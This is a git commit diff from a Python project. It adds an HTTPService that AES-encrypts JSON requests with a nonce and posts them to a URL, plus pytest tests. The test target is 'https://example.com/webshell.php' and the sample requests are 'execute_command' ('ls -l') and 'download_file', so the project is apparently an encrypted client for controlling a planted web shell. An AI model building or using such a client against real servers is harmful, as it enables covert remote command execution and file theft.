460ebb7c8dd87272527fb303252747f36dee669d
David Gilarranz Ortega <david.gilarranz016@comunidadunir.net>
2025-06-11 21:04:42 +0200

    HTTPService -> sends correct request

--- src/http_service.py
+++ src/http_service.py
@@ -1,5 +1,27 @@
 from src.singleton import Singleton
+from src.cypher import AESCypher
+
+from typing import Any
+import requests
+import json
 
 class HTTPService(Singleton):
-    def initialize(self, key: bytes, iv: bytes, nonce: str) -> None:
-        pass
+    def initialize(self, url: str, key: bytes, nonce: str) -> None:
+        self.__url = url
+        self.__nonce = nonce
+        self.__cypher = AESCypher(key)
+        self.__session = requests.session()
+
+    def send_request(self, request: dict[str, Any]) -> str:
+        # Add nonce and encrypt the request
+        request['nonce'] = self.__nonce
+        jsonBody = json.dumps(request)
+        encrypted_request = self.__cypher.encrypt(jsonBody)
+
+        # Send the request
+        response = self.__session.post(self.__url, json = {
+            'body': encrypted_request['body'],
+            'iv': encrypted_request['iv'],
+        })
+
+        return ''
--- tests/test_http_service.py
+++ tests/test_http_service.py
@@ -1,9 +1,14 @@
 from src.http_service import HTTPService
 from src.singleton import Singleton
+from src.cypher import AESCypher
+from typing import Any
+from pytest_mock import MockFixture
 
 import pytest
 import secrets
 import binascii
+import requests
+import json
 
 ################################################################################
 #                                                                              #
@@ -14,15 +19,15 @@ import binascii
 @pytest.fixture
 def http_service() -> HTTPService:
     # Initialize variables
+    url = 'https://example.com/webshell.php'
     key = secrets.token_bytes(32)
-    iv = secrets.token_bytes(32)
-    nonce = binascii.hexlify(secrets.token_bytes(16))
+    nonce = binascii.hexlify(secrets.token_bytes(16)).decode()
 
     # Create and yield the instance
     http_service = HTTPService()
-    http_service.initialize(key, iv, nonce)
+    http_service.initialize(url, key, nonce)
     yield http_service
-
+    
     # Destroy the created instance to reset state
     delattr(HTTPService, 'instance')
 
@@ -36,4 +41,57 @@ def test_http_service_is_singleton(http_service: HTTPService) -> None:
     # Expect the instance to be a Singleton
     assert isinstance(http_service, Singleton)
 
+def test_sends_encrypted_request(mocker: MockFixture) -> None:
+    request = { 'action': 'execute_command', 'args': { 'cmd': 'ls -l' } }
+    run_test_request_args_scenario(request, mocker)
 
+def test_sends_encrypted_request_using_supplied_dict(mocker: MockFixture) -> None:
+    request = { 'action': 'download_file', 'args': { 'filename': 'test.txt' } }
+    run_test_request_args_scenario(request, mocker)
+
+################################################################################
+#                                                                              #
+# Test scenarios to reduce test-case code duplication                          #
+#                                                                              #
+################################################################################
+
+def run_test_request_args_scenario(request: dict[str, Any], mocker: MockFixture) -> None:
+    # Create a mocked 'Session' object and mock requests.session to return it
+    mock_session = mocker.MagicMock()
+    mocker.patch('requests.session')
+    requests.session.return_value = mock_session
+
+    # Initialize variables
+    url = 'https://example.com/webshell.php'
+    key = secrets.token_bytes(32)
+    nonce = binascii.hexlify(secrets.token_bytes(16)).decode()
+
+    # Create and initialize the HTTPService
+    http_service = HTTPService()
+    http_service.initialize(url, key, nonce)
+
+    # Use the HTTPService to send a request
+    http_service.send_request(request)
+
+    # Verify the HTTPService used the session to send the request
+    mock_session.post.assert_called_once()
+    args, kwargs = mock_session.post.call_args
+
+    # Verify the request was sent to the correct URL
+    assert len(args) == 1 and args[0] == url
+
+    # Verify the payload is as expected
+    cypher = http_service._HTTPService__cypher
+    raw_body = cypher.decrypt(kwargs['json']['body'], kwargs['json']['iv'])
+    body = json.loads(raw_body)
+
+    assert body['action'] == request['action'] and body['args'] == request['args'] and body['nonce'] == nonce
+
+    # Destroy the created instance to reset state
+    delattr(HTTPService, 'instance')
+
+################################################################################
+#                                                                              #
+# Helper functions and classes                                                 #
+#                                                                              #
+################################################################################
